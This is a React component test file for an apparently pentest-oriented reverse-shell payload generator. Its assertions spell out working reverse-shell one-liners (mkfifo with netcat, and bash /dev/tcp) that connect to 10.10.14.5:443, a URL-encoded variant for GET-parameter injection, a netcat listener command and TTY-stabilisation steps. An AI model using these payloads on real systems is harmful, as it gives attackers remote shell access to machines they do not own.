// @vitest-environment jsdom
import React from "react";
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, expect, it, vi } from "vitest";
import ReverseShellPanel from "./ReverseShellPanel";

afterEach(cleanup);

it("builds the payload from LHOST/LPORT and defaults to the mkfifo netcat variant", () => {
  render(<ReverseShellPanel onStartListener={vi.fn()} />);
  fireEvent.change(screen.getByLabelText("LHOST"), { target: { value: "10.10.14.5" } });
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "443" } });

  expect(screen.getByText(
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f",
  )).toBeTruthy();
});

it("switches payload kind and URL-encodes it for use as a GET parameter", () => {
  render(<ReverseShellPanel onStartListener={vi.fn()} />);
  fireEvent.change(screen.getByLabelText("LHOST"), { target: { value: "10.10.14.5" } });
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "443" } });
  fireEvent.change(screen.getByLabelText("쉘 종류"), { target: { value: "bash" } });
  fireEvent.click(screen.getByLabelText(/URL 인코딩/));

  expect(screen.getByText(encodeURIComponent(
    "bash -i >& /dev/tcp/10.10.14.5/443 0>&1",
  ))).toBeTruthy();
});

it("starts the listener on the typed port", () => {
  const onStartListener = vi.fn();
  render(<ReverseShellPanel onStartListener={onStartListener} />);
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "9001" } });
  fireEvent.click(screen.getByText("리스너 준비 (nc -lvnp)"));
  expect(onStartListener).toHaveBeenCalledWith("9001");
});

it("includes the pty.spawn shell-stabilization steps", () => {
  render(<ReverseShellPanel onStartListener={vi.fn()} />);
  expect(screen.getByText(/pty\.spawn/)).toBeTruthy();
  expect(screen.getByText(/stty raw -echo/)).toBeTruthy();
});
